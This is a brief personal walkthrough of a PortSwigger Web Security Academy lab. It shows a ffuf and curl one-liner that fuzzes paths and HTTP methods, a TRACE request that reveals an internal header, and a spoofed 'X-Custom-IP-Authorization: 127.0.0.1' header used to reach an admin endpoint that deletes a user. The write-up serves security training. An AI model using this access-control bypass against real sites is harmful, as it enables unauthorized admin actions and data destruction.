https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass

If do you want to see the headers and param miner doesn't detect any, there's no request reflection, the only way is by sending a TRACE

Assuming we have not read the lab solution, there's an interesting one-liner

```sh
ffuf -u https://<LAB-ID>.web-security-academy.net/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -s | xargs -I {} bash -c 'for method in $(cat /usr/share/seclists/Fuzzing/http-request-methods.txt); do curl -s -o /dev/null -w "%{http_code} %{url_effective} -X $method\n" -X $method https://<LAB-ID>.web-security-academy.net/{}; done'
```
and see we could send a TRACE for admin pannel
![[Pasted image 20241106194736.png]]
Then use the custom header to bypass the application rules
![[Pasted image 20241106195251.png]]
And then we can send `GET /admin/delete?username=carlos` with the header `X-Custom-IP-Authorization: 127.0.0.1`